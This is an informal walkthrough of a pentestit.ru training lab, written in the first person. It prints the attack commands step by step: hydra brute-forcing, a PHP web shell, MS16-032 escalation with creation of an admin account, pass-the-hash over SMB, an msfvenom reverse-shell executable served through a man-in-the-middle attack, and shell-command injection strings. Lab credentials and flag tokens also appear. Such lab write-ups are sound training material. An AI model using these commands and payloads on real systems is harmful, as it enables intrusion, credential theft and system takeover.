firstly to discover the LAN:
    nmap 192.168.101.0/24

our output is :

Nmap scan report for 192.168.101.10
Host is up (0.34s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
88/tcp   open  kerberos-sec
8080/tcp open  http-proxy

Nmap scan report for 192.168.101.11
Host is up (0.23s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

secondly i will use the 
vulners script for 192.168.101.10


👁 ~$ nmapv 192.168.101.10

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-15 22:24 +03
Nmap scan report for 192.168.101.10
Host is up (0.31s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE VERSION
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    nginx 1.12.1
88/tcp   open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
8080/tcp open  http    nginx
|_http-server-header: nginx
Service Info: Host: -mail.ptest.lab

no info available from vulners.

on 8080 there is a roundcube login page.
on 80 there is a wordpress website.
i think it is good to use wpscan here.
on the other hand, in the main page, there is a link which is redirecting to CRM login. Nice, the CRM token must be here!(on :88)
let's use the searchsploit to find if
a vuln is available.

i used hydra to bruteforce the CRM login page 
with rockyou wordlist. In a long time it is founded out to be "blackstar".
so i logged in with admin username and password.
and i used the exploit when you upload a company logo, you can upload a php script. i created a simple web shell where you can simply use ?cmd parameter to execute shell commands. I got the CRM token. Then I noticed the credentials in other page which is, admin@test.lab and darthvader.
So I decided to try these credentials in :88 page.
Bingo it is.Then, in mail, i got a ssh priv key 
with tech username. I tried to connect 11.Then im in.
I searched and checked if i can reach shadow file or
other ssh files, or website directories, i found
nothing but openVPN conf files in /etc/openvpn
directory.I noticed that auth text but I cant 
read then also figured out this machine has nmap then I tried to scan other machines.Ifconfig says there is an another connection with eth1 and our ip is in 192.168.13.x then I decided to scan this network.
$ nmap -sV -vv 192.168.13.0/24
but it found nothing.
and I remembered the network topology map.
I see there are 3 machine in there.
It must be  blocking me. and I added -Pn parameter.
$ nmap -sV -vv -Pn  192.168.13.1-3
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

Nmap scan report for 192.168.13.2
Host is up (0.00071s latency).
Scanned at 2018-01-19 00:48:08 MSK for 19s
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

Nmap scan report for 192.168.13.3
Host is up (0.0010s latency).
Scanned at 2018-01-19 00:48:08 MSK for 19s
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows

All machines have RDP connection.
Great let's find them.
I will use sshutle to create a VPN to connect to RDP.
$ sshutle -e "ssh -i priv_key.key" " -r tech@192.168.101.11:2222 192.168.13.0/244
after connection is established.
$ xfreerdp /v:192.168.13.1:3389 /f /cert-ignore /sound /printer /drive:home,/media/user -sec-nla /toggle-fullscreen

There are two accounts which names are arm554 and user.
Let's bruteforce it with hydra!

$ hydra -s 3389 -V -l arm554 -P rockyou.txt rdp://192.168.13.1

and I poured a cup of coffee then wait.
because of my slow connection after half an hour it founded out to be "tiger".
and i started to find anything valuable.
-there is a contact with named Denis.
nothing else.
user file cannot be reached. maybe there is an local exploit to read it. when i googled it i found a vulnerability which named ms16-032. i downloaded it and i must upload to this 13.1 machine. I will use rdesktop

$ rdesktop-vrdp 192.168.13.1 -r disk:share=/home/echelon/Belgeler/research/labpentestitru/ms16

copy it and run cmd.exe

then;
>powershell -ExecutionPolicy Bypass
>Import-Module .\39719.ps1
>Invoke MS16-032
let's create an admin user.

>net user echelon asdasd /add
>net localgroup administrators echelon /add

there you go.

then login into new admin account.
i found Im_your_father token.

then im going back to what I have found a VPN configure in 192.168.101.11.
I found a openvpn brute forcer script and edited it to use while i am in pentestit.ru VPN.
and decided to use rockyou wordlist again.
Drink coffee and wait....
It is founded out to be "starwars". It looks like the pentestit group love starwars so much :)

connect to openvpn
$ openvpn server.conf
auth-name: Office-2
auth-password: starwars

Im seeing the ip route add 172.16.0.0/24 via 10.255.0.17
let's nmap it
while nmapping i checked the network topology figure.
yes, i can reach the 172.16.0.14/16/17/10 machines.
i don't know why but my nmap was so slow then i restarted it.

nmap results are:
Nmap scan report for 172.16.0.12
Host is up (0.27s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.16.0.13
Host is up (0.31s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http

Nmap scan report for 172.16.0.14
Host is up (0.27s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
631/tcp closed ipp

Nmap scan report for 172.16.0.16
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.16.0.18
Host is up (0.30s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

so there are 12,13,18 too.

172.16.0.10 result is:

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2017-07-01 04:25:45Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: Test.Lab, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: TESTLAB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: Test.Lab, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings: 
|   TLSSessionReq: 
|     YW$H
|     ~![/ 
|     0#1!0
|     WIN-U9CSMSIDNP7.Test.Lab0
|     170629064711Z
|     171229064711Z0#1!0
|     WIN-U9CSMSIDNP7.Test.Lab0
|     gEF8
|     sPiB
|     =hG:
|     %"60
|     xm?YZ
|     a2-V
|     $0"0
|     yucI
|     .8ex
|_    z=`H
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC

<-- AD token is here.

on .13 i see roundcube login page, which is the same with credentials earlier.
lets check 11 too, because i can manually ping it, i dont know why nmap didnt show it.

Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp open  http    nginx 1.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 380.12 seconds

I entered the website. This is the first page in first machine. Let's wpscan it.

$ wpscan --url 192.168.101.10 --random-agent

there are a lot vulnerabilities but I have to login to execute them.
But, wpscan found also a plugin which is kittycatfish-2.2 let's google it if it has vuln or not.
yes it has,192.168.101.10/wp-content/plugins/kittycatfish/kittycatfish.php?kc_ad=16
but when i try to sqlmap in 192.168.101.0/24, the server ban me, (WAF?)
i tried in Office-2 network.
And success token is Site_on_dark_side

wp_users may useful let's note it

display_name | user_activation_key | user_email | user_login | user_nicename | user_pass
labadmin     |1499099563:$P$BtZbMAg86izGMo5ou/Re/ieCEhx3fQ0 |admin@test.lab|labadmin|labadmin|$P$BZDm7sK8rozioz3Wjeq5Shc7qupg270

oh great.

.14 there is CUPS token.
When you reach the website there are 2 options one is admin panel and local storage.
Admin has basic authentication, i dont know any password then I clicked the local storage button.
Yay another bruteforce task.
let's fire up burp suite!
then enter the classical login credentials admin:admin to let burpsuite to catch the request, then send it to intruder.
add sql injection from list.
With Lengths i decided to use '%20or%20'x'%3d'x parameter to SQLi.
Then, i logged in, great.
One photo came to my attention, with Hello Morgan title.
There is a RSA private key.
But first, another file with funny name.
"4e 6f 5f 70 61 70 65 72" i encoded to ascii.
It is No_paper. Then , i check if it is token or not.
I disappointed because it was a real quick token.
let's back to private key.
it is from k.jackson@test.lab
to h.morgan@test.lab

access key for 172.16.0.252

before we go in, earlier i found a microsoft machine at .10
it came to my attention it has kerberos and smb.
I am wondering if I get any valid username.

what I have got usernames earlier, I remembered.

admin
labadmin
arm440
arm441
arm550
arm554
arm664
arm672
k.jackson
h.morgan


i will try these names with nmap

$ nmap -p 88 --script krb5-enum-users--script-args krb5-enum-users.realm='test.lab',userdb=usernames.txt 172.16.0.10


PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    arm554@test.lab

arm554 is a valid username.
earlier, in RDP i found a hash "6361DEA164EE8FE91FE7B117FBC9CA5E"
maybe it may be a NT hash. use like this:

$ smbclient --user=arm554 --list=172.16.0.10 --pw-nt-hash

Enter MYGROUP\arm554's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	files           Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.

lets check files
$  smbclient --user=arm554 //172.16.0.10/files --pw-nt-hash

in dir i have two files. lets get them

$cat token.txt
No_more_admins
yay!

$cat network_test.txt
Hi, mate! Need to test ARP-table in DIR subnet.
I'll install intercepter admin:77_GrantedSuperAdmin_77
it is a hint obviously.

I decided to search this .252 machine
I uploaded the script which I have used earlier.
but I have found nothing.
No services at all.
So for a long time, I tried to figure out what is this password exactly.
And I got a hint, proxychains.
Then I set up the proxychains conf /etc/proxychains.conf
socks4 127.0.0.1 8080
and connect to .252 with ssh
$ ssh -D 8080 -i priv.key morgan@172.16.0.252
and I decided to go for 192.168.12.x machines
quick nmap reports they have RDP connection

$ proxychains xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2

oh, im in.

first glance, i see a todo list and copied to my machine
then I saw the directory of Soft\ in C:\
Netcat and Intercepter are exists in here.
So earlier note he was saying check ARP-table.
We have netcat
We have intercepter. ( which is noted also earlier.)
So MiTM is waiting

I setted up the intercepter
And i filtered not neccessary (maybe it is idk)
with port not 3389 & port not 6221 option
And I saw a HTTP request which is getting quake3.exe
let's craft a revershell

$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.12.2 LPORT=1881 -f exe > quake3.exe

share it

$ same but add xfreerdp /drive:share,/home/echelon/Belgeler/research/labpentestitru/walkthroughs/_lab11/12.2
then configure the inceptor last time
and get command prompt
> nc -lvp 1881
then wait...
when I got shell i searched for token and i found in
c:\users\director\documents\token.txt
Sn1ff_Sn1ff
aand, I got a ssh pub key too.

i connect with sshutle to this ssh with this command:

$ sshuttle -e "ssh -i priv.key" -r morgan@12.16.0.252 192.168.10.0/24 192.168.11.0/24 192.168.12.0/24

then ssh -i priv.key 192.168.11.1 -l remote

i came across with a menu that asks me to which server I want to connect
I choose Srv1

and previous todo list it came to my mind if there is a python script or not
$ find -type f | egrep -i "ftpclient.py"
it is founded in /var/www/html

ftp connect credentials:
ip 172.16.0.17 port 21
login user: acontrol pass: IControlEverything

it gets /var/www/html/db.csv

and another login credentials in login.php
admin@11.lab
pwd admin
and it goes to parse.php?auth=asdfgtgrfedQWERsdfd

ftp cannot reach this, idk why.
And I stuck for hours then I tried to command injection to first menu
which is asking you to choose a server.
I get dash with "Srv3 || /bin/dash >&2
i tried to find the running script
and i found the script in
/opt/gh
and these servers were Srv1:172.16.0.16 and 192.168.10.1
and their ssh keys in /home/remote/.ssh/id_rsa
in Srv2
i looked in the .bash_history
i have seen there is a pcap file
i downloaded with
$ scp -i priv.key aengineer@192.168.10.1:/var/tmp/dump.pcap dump.pcap
while i'm downloading it i entered the website that shows the db.csv file
i thought, in this file we can inject a command. because of the exec() command
on the other hand previous todo.txt list there was info about 2020 port that ftpclient.py uses.
Maybe If I would try to sniff it, I can get something important.
I downloaded the pcap file and open it with NetworkMiner
when i grep password i found user=user&password=4E3j3C3v
i logged in to 192.168.10.3 ownCloud service.
i found a file named my_store.kdbx
it is a keepass password database.
i will come to later, i think i have missed it.
i couldn't find why ftpclient cannot connected there was only SYN packets.
so I connected to 192.168.10.1 again and listen it and echo some string.
$ echo -e "220" | nc -nlvp 2020
there it comes yes!

aengineer@tl11-192-168-10-1:~$ echo -e "220" | nc -nlvp 2020
listening on [any] 2020 ...
connect to [192.168.10.1] from (UNKNOWN) [192.168.11.4] 11114
USER ConnectToken

so it tries to connect to ftp.
lets change it with:
$ echo -e "220\n331" | nc -nlvp 2020

aengineer@tl11-192-168-10-1:~$ echo -e "220\n331" | nc -nlvp 2020
listening on [any] 2020 ...
connect to [192.168.10.1] from (UNKNOWN) [192.168.11.4] 11118
USER ConnectToken
PASS Con_con_con

oh, it was so hard for me.
because there are 2 quests included in this machine i think,they distracted me.
I found token.sec which wwwd-data can read it and other cloud token also as well.
So i will continue with to read token.sec
later i found connect token was nothing to do with this machine.
lol, i got that token with luck.
I said in db.csv we can do command injection because of exec()
to do so, we must connect to .17 ftp or we can go with ssh key then look /var/ftp dir
and i went to with ssh connection
i will write here
Echelon;1881;0;0| cat /var/www/html/db.csv;0
and wait to upload itself.

there it is Access_Granted!

it was so easy.

And for cloud, we have a KeePass cracker program in windows. Which is, KeeCracker.
Use with rockyou wordlist.
KeeCracker.exe my_store.kdb -w rockyou.txt
I opened it and went to outside.
When I came back it founded out to be reajel

The token is Sky_is_Over!
lets back to 192.168.11.1 to find other machines in this network
get dash in menu with earlier command injection.
and nmap other machines

Nmap discovered on 25 port a smtp service.

Nmap scan report for 192.168.11.5
Host is up (0.0032s latency).
Scanned at 2018-01-28 23:31:47 MSK for 20s
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
25/tcp open  smtp    Sendmail (Not accepting mail)
Service Info: Host: tl11-192-168-11-5.mail-dev; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Also have a website on 11.3

i found an exploit in exploit-db which is 4761.
black-hole Remote  Command Execution.
I tried to change this exploit to get reverse shell.
i will use 192.168.10.1 machine to reach.
Post-exploit firstly i looked to etc/passwd
and little bit searching too but nothing found else
i found an exploit for ossec
then used exploit with touch "1881\$(chmood 777 root)"
echo "1881" > 1881*
then $cat token
Anti_Virus_not_a_Virus


192.168.11.3 has SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3
in panel user:password is a correct credential.
In closed tickets there is an information about SSH server shows too much info about itself.
Maybe it is a hint, i noted it.

user/oper_1/oper_2/admin

i fired up the dirbuster and it found
_admin/login.php
There is an information about leaking. Few hours to think, i figure out this is magic numbers.
I tried so much combination and found that cutting sha1 magic number is worked.
10932 | 435112
in removed tickets
I have found the token : Help_me!
and there is ssh password It's John he says. Y2O@TRl!YWRmM is the password.
